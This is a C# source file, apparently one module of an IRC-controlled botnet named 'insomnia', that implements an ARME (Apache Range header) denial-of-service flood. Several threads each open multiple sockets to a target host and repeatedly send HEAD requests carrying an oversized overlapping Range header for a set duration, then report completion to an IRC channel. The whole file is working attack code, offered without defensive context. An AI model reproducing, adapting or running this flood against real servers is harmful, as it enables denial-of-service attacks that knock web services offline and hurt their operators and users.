using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Diagnostics;

namespace insomnia
{
    class ARME
    {
        private static string bytes = GenBytes();
        public static string host;
        public static int port;
        public static int delay;
        public static int threads = 5;
        public static int sockets = 10;

        private static IPEndPoint _ip;
        private static ThreadStart[] _ts;
        private static Thread[] _t;

        public static bool isEnabled = false;

        // Generate byte data sent by ARME
        private static string GenBytes()
        {
            string data = String.Empty;

            for (int i = 0; i < 1300; i++)
                data += ",5-" + i;

            return data;
        }

        public static void Start()
        {
            Thread arme = new Thread(Begin);
            arme.IsBackground = true;
            arme.Start();
        }

        private static void Begin()
        {
            try
            {
                _ip = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            }
            catch
            {
                _ip = new IPEndPoint(IPAddress.Parse(host), port);
            }

            _t = new Thread[threads];
            _ts = new ThreadStart[threads];

            for (int i = 0; i < threads; i++)
            {
                _ts[i] = new ThreadStart(SendPayload);
                _t[i] = new Thread(_ts[i]);
                _t[i].Start();
            }

            Thread.Sleep(delay * 1000);
            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("ARME flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private static void SendPayload()
        {
            try
            {
                string request = "HEAD / HTTP/1.1\r\nHost: {0}\r\nRange:bytes=0-{1}\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
                string build_request = string.Format(request, host, bytes);
                byte[] data = Encoding.UTF8.GetBytes(build_request);

                // Build socket array
                Socket[] _s = new Socket[sockets];
                for (int i = 0; i < sockets; i++)
                    _s[i] = new Socket(_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                // As long as flood is enabled lets send data on each socket
                while (isEnabled)
                {

                    foreach (Socket s in _s)
                    {
                        if (!s.Connected)
                            try { s.Connect(_ip.Address, port); } catch {}
                        else
                            try { s.Send(data, data.Length, 0); } catch { }
                    }
                    Thread.Sleep(1000);
                }

                foreach (Socket s in _s)
                {
                    s.Shutdown(SocketShutdown.Both);
                    s.Close();
                }
            }
            catch
            {
            }
        }

    }
}
